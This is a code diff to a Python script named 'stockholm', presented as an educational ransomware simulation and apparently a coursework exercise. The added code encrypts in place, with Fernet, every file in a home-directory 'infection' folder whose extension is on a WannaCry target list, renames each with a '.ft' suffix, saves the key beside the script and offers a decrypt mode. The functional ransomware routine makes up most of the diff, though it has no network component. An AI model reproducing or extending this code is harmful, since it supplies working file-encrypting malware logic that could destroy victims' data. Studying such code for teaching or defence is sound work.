@@ -7,6 +7,7 @@
 import argparse
 import logging
 from pathlib import Path
+from cryptography.fernet import Fernet, InvalidToken
 
 ####################
 # Globale variable #
@@ -34,7 +35,7 @@ WANNACRY_EXTENSION = ['.123', '.jpeg', '.rb', '.602', '.jpg', '.rtf', '.doc', '.
 # Program #
 ###########
 
-def parse_args():
+def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description='stockholm - Educational ransomware simulation', prog='stockholm')
     group = parser.add_mutually_exclusive_group()
     group.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
@@ -44,32 +45,81 @@ def parse_args():
     return parser.parse_args()
 
 
-def check_dir_exist():
-        home = Path.home()
-        infection_dir = home / "infection"
+def check_dir_exist() -> Path:
+    home = Path.home()
+    infection_dir = home / "infection"
 
-        if not infection_dir.is_dir():
-            raise FileNotFoundError("The infection directory does not exist")
+    if not infection_dir.is_dir():
+        raise FileNotFoundError("The infection directory does not exist")
 
-        return infection_dir
+    return infection_dir
+
+
+def decrypt(args: argparse.Namespace, files_tuple: tuple) -> None:
+    cipher = Fernet(args.reverse)
+
+    for file in files_tuple:
+        suffix = str(file).split('.')
+        if suffix[-1] == "ft" and f'.{suffix[-2]}' in WANNACRY_EXTENSION:
+            with open(file, 'rb') as f:
+                data = f.read()
+
+            decrypted_data = cipher.decrypt(data)
+
+            with open(file, 'wb') as f:
+                f.write(decrypted_data)
+
+            decrypted_filename = str(file)[0:-3]
+            file.rename(decrypted_filename)
+
+
+def key_generator() -> bytes:
+    key = Fernet.generate_key()
+
+    with open(f'{Path(__file__).resolve().parent}/key.txt', 'wb') as f:
+        f.write(key)
+
+    return key
+
+
+def encrypt(args: argparse.Namespace, files_tuple: tuple) -> None:
+    cipher = Fernet(key_generator())
+
+    for file in files_tuple:
+        suffix = Path(file).suffix
+        if suffix in WANNACRY_EXTENSION:
+            with open(file, 'rb') as f:
+                data = f.read()
+
+            encrypted_data = cipher.encrypt(data)
+
+            with open(file, 'wb') as f:
+                f.write(encrypted_data)
+
+            encrypted_filename = f'{file}.ft'
+            file.rename(encrypted_filename)
+
+            if (not args.silent):
+                print(encrypted_filename)
 
 
 def main():
     try:
         args = parse_args()
 
-        files_list = list(check_dir_exist().iterdir())
+        files_tuple = tuple(check_dir_exist().iterdir())
 
-        for file in files_list:
-            if Path(file).suffix in WANNACRY_EXTENSION:
-                with open(file, 'r+', encoding='utf-8') as f:
-                    read_data = f.read()
-                    print(f'{f.name} {read_data}')
+        if (not args.reverse):
+            encrypt(args, files_tuple)
+        else:
+            decrypt(args, files_tuple)
 
     except FileNotFoundError as e:
         logging.error(e)
     except PermissionError as e:
         logging.error(e)
+    except InvalidToken as e:
+        logging.error("Bad deciphering key")
     except Exception as e:
         logging.error(e)
 
